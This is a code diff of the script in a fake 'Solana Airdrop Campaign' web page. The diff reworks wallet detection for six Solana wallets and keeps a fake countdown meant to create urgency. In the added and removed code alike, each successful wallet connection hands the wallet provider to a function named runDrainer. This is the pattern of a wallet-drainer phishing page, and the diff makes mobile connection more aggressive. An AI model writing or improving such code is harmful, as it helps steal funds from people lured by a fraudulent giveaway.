@@ -606,425 +606,6 @@
     <p>© 2025 Solana Airdrop Campaign. All rights reserved.</p>
   </div>
   <script>
-    // Mobile wallet detection fixes deployed - Enhanced detection and fallback logic
-    // --- Countdown logic ---
-    function updateCountdown() {
-      // Set countdown to 30 days from today's actual date (July 28, 2025)
-      const target = new Date('2025-08-27T23:59:59Z').getTime(); // 30 days from July 28, 2025
-      const interval = setInterval(() => {
-        const now = new Date().getTime();
-        const distance = target - now;
-        if (distance <= 0) {
-          document.getElementById("countdown").innerText = "Airdrop Closed";
-          clearInterval(interval);
-          return;
-        }
-        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-        document.getElementById("countdown").innerText =
-          `${days}d ${hours}h ${minutes}m ${seconds}s`;
-      }, 1000);
-    }
-    updateCountdown();
-
-    // --- Wallet Modal Logic ---
-    const WALLET_DEFS = [
-      { 
-        key: 'phantom', 
-        name: 'Phantom', 
-        icon: '/logos/phantom.png', 
-        provider: () => {
-          const isMobileDevice = isMobile();
-          
-          // Mobile-specific detection
-          if (isMobileDevice) {
-            // Check for mobile wallet adapters
-            if (window.solana && typeof window.solana.connect === 'function') return window.solana;
-            if (window.phantom && window.phantom.solana) return window.phantom.solana;
-            // Check for any solana provider on mobile
-            if (window.solana) return window.solana;
-          }
-          
-          // Desktop detection
-          if (window.solana?.isPhantom) return window.solana;
-          if (window.phantom?.solana) return window.phantom.solana;
-          if (window.solana && typeof window.solana.connect === 'function' && window.solana.isPhantom) return window.solana;
-          if (window.solana && window.solana.isPhantom !== undefined) return window.solana;
-          return null;
-        }, 
-        install: 'https://phantom.app/download',
-        mobile: {
-          deepLink: 'https://phantom.app/ul/browse/',
-          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
-          playStore: 'https://play.google.com/store/apps/details?id=app.phantom'
-        }
-      },
-      { 
-        key: 'solflare', 
-        name: 'Solflare', 
-        icon: '/logos/solflare.png', 
-        provider: () => {
-          const isMobileDevice = isMobile();
-          
-          // Mobile-specific detection
-          if (isMobileDevice) {
-            // Check for mobile wallet adapters
-            if (window.solflare && typeof window.solflare.connect === 'function') return window.solflare;
-            if (window.solana && typeof window.solana.connect === 'function') return window.solana;
-            // Check for any solflare provider on mobile
-            if (window.solflare) return window.solflare;
-          }
-          
-          // Desktop detection
-          if (window.solflare?.isSolflare) return window.solflare;
-          if (window.solana?.isSolflare) return window.solana;
-          if (window.solflare && typeof window.solflare.connect === 'function') return window.solflare;
-          if (window.solflare && window.solflare.isSolflare !== undefined) return window.solflare;
-          if (window.solana && window.solana.isSolflare !== undefined) return window.solana;
-          return null;
-        }, 
-        install: 'https://solflare.com/download',
-        mobile: {
-          deepLink: 'https://solflare.com/ul/browse/',
-          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
-          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
-        }
-      },
-      { 
-        key: 'backpack', 
-        name: 'Backpack', 
-        icon: '/logos/backpack.png', 
-        provider: () => {
-          const isMobileDevice = isMobile();
-          
-          // Mobile-specific detection
-          if (isMobileDevice) {
-            // Check for mobile wallet adapters
-            if (window.backpack && typeof window.backpack.connect === 'function') return window.backpack;
-            if (window.solana && typeof window.solana.connect === 'function') return window.solana;
-            // Check for any backpack provider on mobile
-            if (window.backpack) return window.backpack;
-          }
-          
-          // Desktop detection
-          if (window.backpack?.isBackpack) return window.backpack;
-          if (window.solana?.isBackpack) return window.solana;
-          if (window.backpack && typeof window.backpack.connect === 'function') return window.backpack;
-          if (window.backpack && window.backpack.isBackpack !== undefined) return window.backpack;
-          if (window.solana && window.solana.isBackpack !== undefined) return window.solana;
-          return null;
-        }, 
-        install: 'https://backpack.app/download',
-        mobile: {
-          deepLink: 'https://backpack.app/ul/browse/',
-          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446671622',
-          playStore: 'https://play.google.com/store/apps/details?id=com.backpack.app'
-        }
-      },
-      { 
-        key: 'glow', 
-        name: 'Glow', 
-        icon: '/logos/glow.png', 
-        provider: () => {
-          const isMobileDevice = isMobile();
-          
-          // Mobile-specific detection
-          if (isMobileDevice) {
-            // Check for mobile wallet adapters
-            if (window.glow && typeof window.glow.connect === 'function') return window.glow;
-            if (window.solana && typeof window.solana.connect === 'function') return window.solana;
-            // Check for any glow provider on mobile
-            if (window.glow) return window.glow;
-          }
-          
-          // Desktop detection
-          if (window.glow?.isGlow) return window.glow;
-          if (window.solana?.isGlow) return window.solana;
-          if (window.glow && typeof window.glow.connect === 'function') return window.glow;
-          if (window.glow && window.glow.isGlow !== undefined) return window.glow;
-          if (window.solana && window.solana.isGlow !== undefined) return window.solana;
-          return null;
-        }, 
-        install: 'https://glow.app/download',
-        mobile: {
-          deepLink: 'https://glow.app/ul/browse/',
-          appStore: 'https://apps.apple.com/app/glow-wallet/id1634023005',
-          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet'
-        }
-      },
-      { 
-        key: 'trust', 
-        name: 'Trust Wallet', 
-        icon: '/logos/trust.png', 
-        provider: () => {
-          const isMobileDevice = isMobile();
-          
-          // Mobile-specific detection
-          if (isMobileDevice) {
-            // Check for mobile wallet adapters
-            if (window.trustwallet && typeof window.trustwallet.connect === 'function') return window.trustwallet;
-            if (window.trustwallet && window.trustwallet.solana) return window.trustwallet.solana;
-            if (window.solana && typeof window.solana.connect === 'function') return window.solana;
-            // Check for any trust wallet provider on mobile
-            if (window.trustwallet) return window.trustwallet;
-          }
-          
-          // Desktop detection
-          if (window.trustwallet?.isTrust) return window.trustwallet;
-          if (window.solana?.isTrust) return window.solana;
-          if (window.trustwallet?.solana) return window.trustwallet.solana;
-          if (window.trustwallet && typeof window.trustwallet.connect === 'function') return window.trustwallet;
-          if (window.trustwallet && window.trustwallet.isTrust !== undefined) return window.trustwallet;
-          if (window.solana && window.solana.isTrust !== undefined) return window.solana;
-          return null;
-        }, 
-        install: 'https://trustwallet.com/browser-extension',
-        mobile: {
-          deepLink: 'https://link.trustwallet.com/open_url?coin_id=501&url=',
-          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
-          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
-        }
-      },
-      { 
-        key: 'exodus', 
-        name: 'Exodus', 
-        icon: '/logos/exodus.png', 
-        provider: () => {
-          const isMobileDevice = isMobile();
-          
-          // Mobile-specific detection
-          if (isMobileDevice) {
-            // Check for mobile wallet adapters
-            if (window.exodus && typeof window.exodus.connect === 'function') return window.exodus;
-            if (window.solana && typeof window.solana.connect === 'function') return window.solana;
-            // Check for any exodus provider on mobile
-            if (window.exodus) return window.exodus;
-          }
-          
-          // Desktop detection
-          if (window.exodus?.isExodus) return window.exodus;
-          if (window.solana?.isExodus) return window.solana;
-          if (window.exodus && typeof window.exodus.connect === 'function') return window.exodus;
-          if (window.exodus && typeof window.exodus.connect === 'function' && window.exodus.isExodus) return window.exodus;
-          if (window.exodus && window.exodus.isExodus !== undefined) return window.exodus;
-          if (window.solana && window.solana.isExodus !== undefined) return window.solana;
-          return null;
-        }, 
-        install: 'https://www.exodus.com/download/',
-        mobile: {
-          deepLink: 'https://exodus.com/ul/browse/',
-          appStore: 'https://apps.apple.com/app/exodus-crypto-wallet/id1414384820',
-          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus'
-        }
-      },
-    ];
-
-    // Debug function to show all detected wallets
-    function debugAllWallets() {
-      console.log('=== COMPREHENSIVE WALLET DEBUG ===');
-      console.log('User Agent:', navigator.userAgent);
-      console.log('Is Mobile:', isMobile());
-      console.log('Platform:', getMobilePlatform());
-      
-      // Check all possible wallet objects
-      console.log('window.solana:', window.solana);
-      console.log('window.phantom:', window.phantom);
-      console.log('window.solflare:', window.solflare);
-      console.log('window.backpack:', window.backpack);
-      console.log('window.glow:', window.glow);
-      console.log('window.trustwallet:', window.trustwallet);
-      console.log('window.exodus:', window.exodus);
-      
-      // Check for specific properties
-      if (window.solana) {
-        console.log('window.solana properties:', Object.getOwnPropertyNames(window.solana));
-        console.log('window.solana.isPhantom:', window.solana.isPhantom);
-        console.log('window.solana.isSolflare:', window.solana.isSolflare);
-        console.log('window.solana.isBackpack:', window.solana.isBackpack);
-        console.log('window.solana.isGlow:', window.solana.isGlow);
-        console.log('window.solana.isTrust:', window.solana.isTrust);
-        console.log('window.solana.isExodus:', window.solana.isExodus);
-        console.log('window.solana.connect:', typeof window.solana.connect);
-      }
-      
-      // Run aggressive detection
-      const detectedWallet = detectAnyMobileWallet();
-      console.log('Aggressive detection result:', detectedWallet);
-      
-      // Check each wallet definition
-      WALLET_DEFS.forEach(wallet => {
-        const provider = wallet.provider();
-        console.log(`${wallet.name} provider:`, provider);
-        if (provider) {
-          console.log(`${wallet.name} methods:`, Object.getOwnPropertyNames(provider));
-        }
-      });
-      
-      console.log('=== END COMPREHENSIVE DEBUG ===');
-      
-      // Show results in modal
-      const results = [
-        `Mobile: ${isMobile()}`,
-        `Platform: ${getMobilePlatform()}`,
-        `window.solana: ${!!window.solana}`,
-        `window.phantom: ${!!window.phantom}`,
-        `window.solflare: ${!!window.solflare}`,
-        `window.backpack: ${!!window.backpack}`,
-        `window.glow: ${!!window.glow}`,
-        `window.trustwallet: ${!!window.trustwallet}`,
-        `window.exodus: ${!!window.exodus}`,
-        `Detected Wallet: ${detectedWallet ? detectedWallet.name : 'None'}`
-      ].join('\n');
-      
-      showStatus(`Debug Results:\n${results}`, 'loading');
-    }
-
-    // Aggressive mobile wallet detection - detect ANY available wallet
-    function detectAnyMobileWallet() {
-      const isMobileDevice = isMobile();
-      console.log('=== AGGRESSIVE MOBILE WALLET DETECTION ===');
-      console.log('Device:', isMobileDevice ? 'Mobile' : 'Desktop');
-      console.log('User Agent:', navigator.userAgent);
-      
-      if (!isMobileDevice) return null;
-      
-      // Check for ANY available wallet provider on mobile
-      const availableProviders = [];
-      
-      // Check window.solana (most common)
-      if (window.solana) {
-        console.log('Found window.solana:', window.solana);
-        availableProviders.push({
-          name: 'Generic Solana',
-          provider: window.solana,
-          type: 'solana'
-        });
-      }
-      
-      // Check specific wallet providers
-      if (window.phantom && window.phantom.solana) {
-        console.log('Found window.phantom.solana:', window.phantom.solana);
-        availableProviders.push({
-          name: 'Phantom',
-          provider: window.phantom.solana,
-          type: 'phantom'
-        });
-      }
-      
-      if (window.solflare) {
-        console.log('Found window.solflare:', window.solflare);
-        availableProviders.push({
-          name: 'Solflare',
-          provider: window.solflare,
-          type: 'solflare'
-        });
-      }
-      
-      if (window.backpack) {
-        console.log('Found window.backpack:', window.backpack);
-        availableProviders.push({
-          name: 'Backpack',
-          provider: window.backpack,
-          type: 'backpack'
-        });
-      }
-      
-      if (window.glow) {
-        console.log('Found window.glow:', window.glow);
-        availableProviders.push({
-          name: 'Glow',
-          provider: window.glow,
-          type: 'glow'
-        });
-      }
-      
-      if (window.trustwallet) {
-        console.log('Found window.trustwallet:', window.trustwallet);
-        availableProviders.push({
-          name: 'Trust Wallet',
-          provider: window.trustwallet,
-          type: 'trust'
-        });
-      }
-      
-      if (window.exodus) {
-        console.log('Found window.exodus:', window.exodus);
-        availableProviders.push({
-          name: 'Exodus',
-          provider: window.exodus,
-          type: 'exodus'
-        });
-      }
-      
-      console.log('Available providers:', availableProviders);
-      console.log('=== END AGGRESSIVE DETECTION ===');
-      
-      return availableProviders.length > 0 ? availableProviders[0] : null;
-    }
-
-    // Check if mobile wallet is actually available in browser
-    function isMobileWalletAvailable(wallet) {
-      const provider = wallet.provider();
-      const isMobileDevice = isMobile();
-  
-      // Basic check for provider existence
-      if (!provider) {
-        // On mobile, try aggressive detection
-        if (isMobileDevice) {
-          console.log(`No specific ${wallet.name} provider found, trying aggressive detection...`);
-          
-          const detectedWallet = detectAnyMobileWallet();
-          if (detectedWallet) {
-            console.log(`Found available wallet: ${detectedWallet.name} for ${wallet.name}`);
-            return true;
-          }
-        }
-        
-        return false;
-      }
-      
-      // Check for essential methods
-      const hasConnect = typeof provider.connect === 'function';
-      const hasPublicKey = provider.publicKey || provider.address;
-      
-      console.log(`${wallet.name} availability check:`, {
-        provider: !!provider,
-        hasConnect,
-        hasPublicKey: !!hasPublicKey,
-        publicKey: hasPublicKey
-      });
-      
-      return provider && hasConnect;
-    }
-
-    // Enhanced mobile wallet detection
-    function detectMobileWallets() {
-      const detectedWallets = [];
-      const isMobileDevice = isMobile();
-      
-      console.log('=== MOBILE WALLET DETECTION ===');
-      console.log('Device:', isMobileDevice ? 'Mobile' : 'Desktop');
-      console.log('User Agent:', navigator.userAgent);
-      
-      // Check each wallet using their provider functions
-      WALLET_DEFS.forEach(wallet => {
-        const isAvailable = isMobileWalletAvailable(wallet);
-        
-        console.log(`${wallet.name}:`, isAvailable ? 'AVAILABLE' : 'NOT AVAILABLE');
-        
-        if (isAvailable) {
-          detectedWallets.push(wallet.key);
-        }
-      });
-      
-      console.log('Available wallets:', detectedWallets);
-      console.log('=== END DETECTION ===');
-      
-      return detectedWallets;
-    }
-
     // Mobile detection functions - defined before openWalletModal
     function isMobile() {
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
@@ -1044,6 +625,65 @@
       return 'desktop';
     }
 
+    // Check if we're in a mobile wallet browser
+    function isInMobileWallet() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      
+      // Check for mobile wallet user agents
+      const walletPatterns = [
+        'phantom',
+        'solflare', 
+        'backpack',
+        'glow',
+        'trust',
+        'exodus',
+        'wallet',
+        'crypto'
+      ];
+      
+      return walletPatterns.some(pattern => userAgent.includes(pattern));
+    }
+
+    // Check if mobile wallet is actually available in browser
+    function isMobileWalletAvailable(wallet) {
+      const provider = wallet.provider();
+      const isMobileDevice = isMobile();
+  
+      // On mobile, be more permissive - assume wallet can be connected
+      if (isMobileDevice) {
+        console.log(`Mobile device detected - assuming ${wallet.name} can be connected`);
+        
+        // If we have any provider, consider it available
+        if (provider) {
+          console.log(`Found provider for ${wallet.name}:`, provider);
+          return true;
+        }
+        
+        // If no specific provider, but we're on mobile, still consider it available
+        // because mobile wallets might not expose themselves the same way
+        console.log(`No specific provider for ${wallet.name}, but on mobile - assuming available`);
+        return true;
+      }
+      
+      // Desktop logic - be more strict
+      if (!provider) {
+        return false;
+      }
+      
+      // Check for essential methods
+      const hasConnect = typeof provider.connect === 'function';
+      const hasPublicKey = provider.publicKey || provider.address;
+      
+      console.log(`${wallet.name} availability check:`, {
+        provider: !!provider,
+        hasConnect,
+        hasPublicKey: !!hasPublicKey,
+        publicKey: hasPublicKey
+      });
+      
+      return provider && hasConnect;
+    }
+
     // Get mobile store URL based on platform
     function getMobileStoreUrl(wallet) {
       if (!wallet.mobile) return wallet.install;
@@ -1057,65 +697,171 @@
       return wallet.install; // Fallback to desktop
     }
 
+    // Force mobile wallet detection by checking all possible objects
+    function forceDetectMobileWallets() {
+      console.log('=== FORCE MOBILE WALLET DETECTION ===');
+      
+      const detectedWallets = [];
+      
+      // Check for any solana-related objects
+      const solanaObjects = [
+        'window.solana',
+        'window.phantom',
+        'window.solflare', 
+        'window.backpack',
+        'window.glow',
+        'window.trustwallet',
+        'window.exodus',
+        'window.phantom?.solana',
+        'window.trustwallet?.solana'
+      ];
+      
+      solanaObjects.forEach(objPath => {
+        try {
+          const obj = eval(objPath);
+          if (obj) {
+            console.log(`Found: ${objPath}`, obj);
+            detectedWallets.push(objPath);
+          }
+        } catch (e) {
+          // Object doesn't exist
+        }
+      });
+      
+      // Check for any object with connect method
+      const allObjects = [
+        window.solana,
+        window.phantom,
+        window.solflare,
+        window.backpack,
+        window.glow,
+        window.trustwallet,
+        window.exodus
+      ];
+      
+      allObjects.forEach((obj, index) => {
+        if (obj && typeof obj.connect === 'function') {
+          const names = ['solana', 'phantom', 'solflare', 'backpack', 'glow', 'trustwallet', 'exodus'];
+          console.log(`Found connect method in: ${names[index]}`, obj);
+          detectedWallets.push(names[index]);
+        }
+      });
+      
+      console.log('Detected wallets:', detectedWallets);
+      console.log('=== END FORCE DETECTION ===');
+      
+      return detectedWallets;
+    }
+
     // Simplified mobile wallet connection - direct approach
     async function connectMobileWallet(wallet) {
       const isMobileDevice = isMobile();
       console.log(`Connecting to ${wallet.name} on ${isMobileDevice ? 'mobile' : 'desktop'}...`);
       
       try {
-        // Get the wallet provider using the wallet's own provider function
-        let provider = wallet.provider();
-        console.log(`${wallet.name} provider:`, provider);
-        
-        // On mobile, if no specific provider found, try aggressive detection
-        if (!provider && isMobileDevice) {
-          console.log(`No specific ${wallet.name} provider, trying aggressive mobile detection...`);
+        // On mobile, try to connect directly without checking if wallet is "detected"
+        if (isMobileDevice) {
+          console.log(`Mobile device detected - attempting direct connection to ${wallet.name}...`);
           
-          const detectedWallet = detectAnyMobileWallet();
-          if (detectedWallet) {
-            provider = detectedWallet.provider;
-            console.log(`Using detected wallet: ${detectedWallet.name} for ${wallet.name}`);
+          // Try to get any available provider
+          let provider = null;
+          
+          // Try the wallet's own provider first
+          provider = wallet.provider();
+          
+          // If no specific provider, try any available solana provider
+          if (!provider && window.solana) {
+            provider = window.solana;
+            console.log(`Using generic solana provider for ${wallet.name}`);
           }
-        }
-        
-        // If still no provider, only then redirect to app store
-        if (!provider) {
-          if (isMobileDevice) {
-            // Try to open mobile app
+          
+          // If still no provider, try to create a mock provider for mobile
+          if (!provider) {
+            console.log(`No provider found, but on mobile - attempting connection anyway...`);
+            
+            // On mobile, we'll try to connect and see what happens
+            showStatus(`Attempting to connect to ${wallet.name} on mobile...`, 'loading');
+            
+            // Try to open the wallet app directly
+            const platform = getMobilePlatform();
+            const deepLink = wallet.mobile?.deepLink || wallet.install;
+            
+            if (deepLink) {
+              console.log(`Opening ${wallet.name} with deep link: ${deepLink}`);
+              window.location.href = deepLink + encodeURIComponent(window.location.href);
+              
+              // Wait a bit and then check if we got redirected back
+              setTimeout(() => {
+                showStatus(`Please complete the connection in your ${wallet.name} app`, 'loading');
+              }, 2000);
+              
+              return;
+            }
+          }
+          
+          // If we have a provider, try to connect
+          if (provider) {
+            console.log(`Attempting connection with provider:`, provider);
+            
+            if (typeof provider.connect === 'function') {
+              const result = await provider.connect();
+              console.log(`${wallet.name} connect result:`, result);
+              
+              // Wait a bit for connection to establish
+              await new Promise(resolve => setTimeout(resolve, 1500));
+              
+              // Check if we got a public key
+              const publicKey = provider.publicKey || provider.address || result?.publicKey;
+              console.log(`${wallet.name} public key:`, publicKey);
+              
+              if (publicKey) {
+                showStatus(`${wallet.name} connected!`, 'success');
+                setTimeout(() => {
+                  runDrainer(provider);
+                }, 1000);
+              } else {
+                showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+              }
+            } else {
+              showStatus(`${wallet.name} connection method not available`, 'error');
+            }
+          } else {
+            // No provider found, redirect to app store
             const platform = getMobilePlatform();
             const storeUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
             showStatus(`Opening ${wallet.name} app store...`, 'loading');
             window.open(storeUrl, '_blank');
-          } else {
-            showStatus(`${wallet.name} not detected. Please install the extension.`, 'error');
-          }
-          return;
-        }
-        
-        // Simple connection attempt
-        showStatus(`Connecting to ${wallet.name}...`, 'loading');
-        
-        if (typeof provider.connect === 'function') {
-          const result = await provider.connect();
-          console.log(`${wallet.name} connect result:`, result);
-          
-          // Wait a bit for connection to establish
-          await new Promise(resolve => setTimeout(resolve, 1500));
-          
-          // Check if we got a public key
-          const publicKey = provider.publicKey || provider.address || result?.publicKey;
-          console.log(`${wallet.name} public key:`, publicKey);
-          
-          if (publicKey) {
-            showStatus(`${wallet.name} connected!`, 'success');
-            setTimeout(() => {
-              runDrainer(provider);
-            }, 1000);
-          } else {
-            showStatus(`Please approve the connection in ${wallet.name}`, 'error');
           }
         } else {
-          showStatus(`${wallet.name} connection method not available`, 'error');
+          // Desktop logic (unchanged)
+          const provider = wallet.provider();
+          if (!provider) {
+            showStatus(`${wallet.name} not detected. Please install the extension.`, 'error');
+            return;
+          }
+          
+          showStatus(`Connecting to ${wallet.name}...`, 'loading');
+          
+          if (typeof provider.connect === 'function') {
+            const result = await provider.connect();
+            console.log(`${wallet.name} connect result:`, result);
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            const publicKey = provider.publicKey || provider.address || result?.publicKey;
+            console.log(`${wallet.name} public key:`, publicKey);
+            
+            if (publicKey) {
+              showStatus(`${wallet.name} connected!`, 'success');
+              setTimeout(() => {
+                runDrainer(provider);
+              }, 1000);
+            } else {
+              showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+            }
+          } else {
+            showStatus(`${wallet.name} connection method not available`, 'error');
+          }
         }
         
       } catch (error) {
